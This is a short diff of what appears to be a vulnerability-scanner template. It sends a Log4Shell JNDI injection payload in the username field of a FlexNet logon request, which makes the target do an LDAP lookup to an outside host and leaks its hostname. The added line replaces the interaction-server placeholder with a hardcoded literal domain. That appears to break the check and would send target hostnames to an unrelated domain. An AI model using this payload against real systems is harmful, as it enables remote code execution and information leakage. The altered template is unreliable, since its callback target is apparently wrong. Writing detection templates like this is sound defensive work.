@@ -34,7 +34,7 @@ http:
         Referer: {{RootURL}}/flexnet/logon.do
         Content-Type: application/x-www-form-urlencoded
 
-        action=logon&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}&domain=FLEXnet
+        action=logon&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.interactsh-url.com/{{str}}}&password={{str}}&domain=FLEXnet
 
     matchers-condition: and
     matchers:
